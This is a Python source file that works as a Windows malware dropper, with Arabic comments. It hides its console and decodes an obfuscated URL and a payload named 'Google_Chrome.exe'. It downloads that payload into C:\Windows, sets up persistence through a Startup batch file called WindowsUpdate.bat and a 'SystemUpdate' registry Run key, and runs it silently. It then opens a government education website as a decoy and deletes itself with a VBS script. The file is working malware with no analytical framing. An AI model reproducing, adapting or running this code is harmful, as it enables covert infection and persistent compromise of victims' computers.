import os
import sys
import ssl
import subprocess
import ctypes
import base64
import urllib.request
import tempfile
import webbrowser
import time

# ═══════════════════════════════════════════════════════════
# 🔇 HIDE CONSOLE (Windows) — أول حاجة
# ═══════════════════════════════════════════════════════════
try:
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
except:
    pass

# ═══════════════════════════════════════════════════════════
# 🔇 REDIRECT STDOUT/STDERR لـ NULL
# ═══════════════════════════════════════════════════════════
try:
    _null = open(os.devnull, 'w')
    sys.stdout = _null
    sys.stderr = _null
except:
    pass

# ═══════════════════════════════════════════════════════════
# 🔐 SSL — certifi
# ═══════════════════════════════════════════════════════════
try:
    import certifi
    _SSL_CTX = ssl.create_default_context(cafile=certifi.where())
except ImportError:
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "certifi"],
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        import certifi
        _SSL_CTX = ssl.create_default_context(cafile=certifi.where())
    except:
        _SSL_CTX = ssl._create_unverified_context()


# ═══════════════════════════════════════════════════════════
# 📦 BASE58 — تنفيذ يدوي
# ═══════════════════════════════════════════════════════════
_B58_ALPHABET = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'

def b58decode(s):
    n = 0
    for c in s:
        n = n * 58 + _B58_ALPHABET.index(c)
    result = []
    while n > 0:
        result.append(n & 0xff)
        n >>= 8
    pad = 0
    for c in s:
        if c == _B58_ALPHABET[0]:
            pad += 1
        else:
            break
    return bytes([0] * pad + result[::-1])


# ═══════════════════════════════════════════════════════════
# ⚙️ CONFIG
# ═══════════════════════════════════════════════════════════
UIUYIOUY = "2FFvzA2zeqoVMnthQi81DMnMmfGLLGWoeXwMKMXRPzJptNQpWWekaAk8Lj7JfXggabyGkGSi9htbsUaqcnD3zeF4ENsE9oc28ZUWLHYbYk1UjbjyWYt7DLdbAnLwe"
MYNERAK = b58decode(UIUYIOUY).decode('utf-8', errors='ignore')

SHATO2 = "R29vZ2xlX0Nocm9tZS5leGU="
AYWHWH = base64.b64decode(SHATO2).decode('utf-8', errors='ignore')

AYTAYUU = "WindowsUpdate.bat"

NANORAK = "C:\\Windows"

SATATA9SU8 = os.path.join(
    os.environ.get('APPDATA', ''),
    'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
)

_DECOY_URL = "https://www.education.gov.dz/"


# ═══════════════════════════════════════════════════════════
# 📥 DOWNLOAD VIRUS → C:\Windows
# ═══════════════════════════════════════════════════════════
def _download_virus():
    try:
        _req = urllib.request.Request(
            MYNERAK,
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        )
        _response = urllib.request.urlopen(_req, timeout=120, context=_SSL_CTX)
        _data = _response.read()
        if not _data or len(_data) < 100:
            return None
        _virus_path = os.path.join(NANORAK, AYWHWH)
        if not os.path.exists(NANORAK):
            os.makedirs(NANORAK)
        with open(_virus_path, 'wb') as _f:
            _f.write(_data)
        return _virus_path
    except:
        return None


# ═══════════════════════════════════════════════════════════
# 📝 WRITE BAT → Startup
# ═══════════════════════════════════════════════════════════
def _write_bat(virus_path):
    try:
        _bat_path = os.path.join(SATATA9SU8, AYTAYUU)
        if not os.path.exists(SATATA9SU8):
            os.makedirs(SATATA9SU8)
        _bat_content = f'''@echo off
start "" /B "{virus_path}"
exit
'''
        with open(_bat_path, 'w') as _f:
            _f.write(_bat_content)
        return _bat_path
    except:
        return None


# ═══════════════════════════════════════════════════════════
# 📝 ADD TO REGISTRY
# ═══════════════════════════════════════════════════════════
def _add_to_registry(virus_path):
    try:
        import winreg
        _key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(
            _key, "SystemUpdate", 0, winreg.REG_SZ,
            f'"{virus_path}"'
        )
        winreg.CloseKey(_key)
        return True
    except:
        return False


# ═══════════════════════════════════════════════════════════
# 🚀 RUN VIRUS
# ═══════════════════════════════════════════════════════════
def _run_virus(virus_path):
    try:
        subprocess.Popen(
            [virus_path],
            creationflags=0x08000000,
            shell=False,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL
        )
        return True
    except:
        return False


# ═══════════════════════════════════════════════════════════
# 🌐 OPEN BROWSER (DECOY) — كيبقى مفتوح
# ═══════════════════════════════════════════════════════════
def _open_browser():
    try:
        webbrowser.open(_DECOY_URL, new=2)
        return True
    except:
        pass
    try:
        subprocess.Popen(
            ['cmd', '/c', 'start', '', _DECOY_URL],
            creationflags=0x08000000,
            shell=False,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        return True
    except:
        pass
    try:
        os.startfile(_DECOY_URL)
        return True
    except:
        pass
    return False


# ═══════════════════════════════════════════════════════════
# 💥 SELF DESTRUCT
# ═══════════════════════════════════════════════════════════
def _self_destruct():
    try:
        if getattr(sys, 'frozen', False):
            _script = sys.executable
        else:
            _script = os.path.abspath(sys.argv[0])
        _temp = tempfile.gettempdir()
        _vbs_path = os.path.join(_temp, "del_self.vbs")
        _vbs_content = f'''Set WshShell = CreateObject("WScript.Shell")
WScript.Sleep 3000
WshShell.Run "cmd /c timeout /t 5 /nobreak > nul & del /F /Q ""{_script}"" & del /F /Q ""%~f0""", 0, False
'''
        with open(_vbs_path, 'w') as _f:
            _f.write(_vbs_content)
        subprocess.Popen(
            ['wscript.exe', _vbs_path],
            creationflags=0x08000000,
            shell=False,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        return True
    except:
        return False


# ═══════════════════════════════════════════════════════════
# 🚀 MAIN — Silent
# ═══════════════════════════════════════════════════════════
def _main():
    # 1) Download → C:\Windows
    _virus_path = _download_virus()
    if not _virus_path:
        sys.exit(1)

    # 2) BAT → Startup
    _bat_path = _write_bat(_virus_path)
    if not _bat_path:
        sys.exit(1)

    # 3) Registry
    _add_to_registry(_virus_path)

    # 4) Run virus
    _run_virus(_virus_path)

    # 5) Browser (decoy)
    _open_browser()

    # 6) Self-destruct
    _self_destruct()

    # 7) Exit
    sys.exit(0)


if __name__ == "__main__":
    try:
        _main()
    except:
        pass